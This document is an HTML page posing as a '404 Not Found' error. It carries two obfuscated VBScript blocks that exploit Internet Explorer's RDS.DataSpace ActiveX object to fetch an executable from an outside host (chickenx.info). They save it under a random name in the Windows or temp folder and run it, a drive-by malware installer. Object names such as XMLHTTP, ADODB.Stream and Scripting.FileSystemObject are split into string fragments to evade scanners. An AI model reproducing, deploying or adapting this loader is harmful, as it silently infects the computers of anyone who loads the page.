

<HTML xmlns:IE>
<body>


<SCRIPT language="VBScript">

Function GetCsID()
GetCsID = "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36" 
End Function

</SCRIPT>

<SCRIPT language="VBScript">
Module_Path="http://chickenx.info/get.php?file=exe"

   If navigator.appName="Microsoft Internet Explorer" Then

      If InStr(navigator.platform,"Win32") <> 0  Then

      Const ssfFONTS=20
      Const adModeReadWrite=3
      Const adTypeBinary=1
      Const adSaveCreateOverWrite=2

      Dim  oRDS
      Dim  oXMLHTTP
      Dim  oFSO
      Dim  oSrm
      Dim  oWShell
      Dim  oShellApp

      Dim  WinDir
      Dim  ExeName
      Dim  XMLBody
      Dim  PluginFile
      Dim  cByte
      Dim   ObjName
      Dim   ObjProg
      Dim   ObjName1
      Dim   ObjProg1
      Dim   ObjName2
      Dim   ObjProg2

      Randomize

      ExeName=GenerateName()

      alf_e="e"
      
      dot123="."

      ExeName=ExeName & dot123 & alf_e & "xe"

      Set  oRDS=document.createElement("object")
      oRDS.setAttribute "id","oRDS"
      oRDS.setAttribute "classid",GetCsID

      Set oShellApp = oRDS.CreateObject("Shell"&dot123&"Application","")
      Set oFolder = oShellApp.NameSpace(ssfFONTS)
      Set oFolderItem=oFolder.ParseName("Symbol"&dot123&"ttf")
      Font_Path_Components=Split(oFolderItem.Path,"\",-1,1)
      WinDir= Font_Path_Components(0) & "\" &  Font_Path_Components(1) & "\"
      ExeName=WinDir & ExeName



      ObjName2="soft"
      ObjName1="Micro"
      ObjName=ObjName1 & ObjName2
      ObjProg2="HTTP"
      ObjProg1="XML"
      ObjProg=ObjProg1 & ObjProg2
      set oXMLHTTP = CreateObject(ObjName & dot123 & ObjProg)
      Req_type="G" & alf_e & "T"
      HTTPSession=oXMLHTTP.Open(Req_Type,Module_Path,0)
      oXMLHTTP.Send()
      On Error Resume Next
      XMLBody=oXMLHTTP.responseBody

      ObjName2="ODB"
      ObjName1="AD"
      ObjName=ObjName1 & ObjName2
      ObjProg2="eam"
      ObjProg1="Str"
      ObjProg=ObjProg1 & ObjProg2
      On Error Resume Next
      Set oSrm=oRDS.CreateObject(ObjName & dot123 & ObjProg,"")
      If Err.number <> 0 Then

            Set oFSO=oRDS.CreateObject("Scr" & "ipting" & dot123 & "FileSys" & "temObject","")
            Set PluginFile=oFSO.CreateTextFile(ExeName, TRUE)
            Plugin_size=LenB(XMLBody)

            For j=1 To Plugin_size
                cByte=MidB(XMLBody,j,1)
                ByteCode=AscB(cByte)
                PluginFile.Write(Chr(ByteCode))
            Next
            PluginFile.Close

            Set  oWShell=oRDS.CreateObject("WScript" & dot123 & "Shell","")
            On Error Resume Next
            oWShell.Run (ExeName),1,FALSE
      Else
            oSrm.Mode=adModeReadWrite
            oSrm.Type=adTypeBinary
            oSrm.Open
            oSrm.Write XMLBody
            oSrm.SaveToFile ExeName,adSaveCreateOverWrite

            oShellApp.ShellExecute ExeName
      End If


      End If
   End If

Function GenerateName()
RandomName=""
rr=Int(4*Rnd)+6
ik=0
Do
  ii=Int(25*Rnd)+97
  RandomName=RandomName+Chr(ii)
  ik=ik+1
Loop While ik<rr
GenerateName=RandomName
End Function

</SCRIPT>

<script language="VBScript">
    

    on error resume next

    Const adSaveCreateOverWrite=2
    Const fineOpen=0

    dl = "http://chickenx.info/get.php?file=exe"
    Set df = document.createElement("object")

    df.setAttribute "classid",GetCsID

    dot123="."
    alf_e="E"
    strr1="Mic"
    strr2="roso"
    strr3="ft"
    strr5="HTTP"
    strr4="XML"
    strr=strr1&strr2&strr3&dot123&&strr4&strr5

    Set x = df.CreateObject(strr,"")
    ab1="A"
    ab4="st"
    ab2="do"
    ab6="am"
    ab3="db."
    ab5="re"
  
    strb1=ab1&ab2&ab3&ab4&ab5&ab6
    strb5=strb1
    set YY = df.createobject(strb5,"")
    YY.type = 1
    str6="G" & alf_e & "T"
    x.Open str6, dl, False
    x.Send
    fnamezz1="file" & dot123 & "exe"


    scripp3="Fil"
    scripp1="Scrip"
    scripp5="mObject"
    scripp2="ting"
    scripp4="eSyste"
    scripp=scripp1&scripp2&dot123&scripp3&scripp4&scripp5

    set FF = df.createobject(scripp,"")
    set tmp = F.GetSpecialFolder(adSaveCreateOverWrite)
    fnamezz1= FF.BuildPath(tmp,fnamezz1)


    YY.open
    YY.write x.responseBody
    YY.savetofile fnamezz1,adSaveCreateOverWrite
    YY.close
    set MM = df.createobject("Shell"&dot123&"Application","")
        MM.ShellExecute fnamezz1,"","","open",fineOpen
</script>
404 Not Found
</body>
</html>